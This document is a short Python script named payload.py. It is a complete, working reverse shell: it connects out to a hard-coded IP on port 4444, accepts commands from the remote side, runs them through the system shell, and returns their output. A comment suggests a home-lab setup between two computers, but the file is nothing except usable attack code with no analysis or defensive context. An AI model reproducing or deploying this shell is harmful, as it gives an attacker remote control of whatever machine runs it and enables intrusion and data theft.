# payload.py
import socket
import subprocess
import os

HOST = '192.168.29.138'  # Replace with your first computer's IP
PORT = 4444

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
    except Exception as e:
        return

    while True:
        try:
            data = b''
            while not data.endswith(b'\n'):
                packet = s.recv(1024)
                if not packet:
                    s.close()
                    return
                data += packet
            cmd = data.decode().strip()
            if cmd.lower() == 'exit':
                break
            if cmd.startswith('cd '):
                path = cmd[3:].strip()
                try:
                    os.chdir(path)
                    s.sendall(b'[+] Changed directory\n')
                except Exception as e:
                    s.sendall(f'[-] {e}\n'.encode())
                continue
            # Run command and capture output
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value, stderr_value = proc.communicate()
            result = stdout_value + stderr_value
            if not result:
                result = b'[+] Command executed\n'
            s.sendall(result)
        except Exception as e:
            s.sendall(f'[-] {e}\n'.encode())
    s.close()

if __name__ == '__main__':
    main()
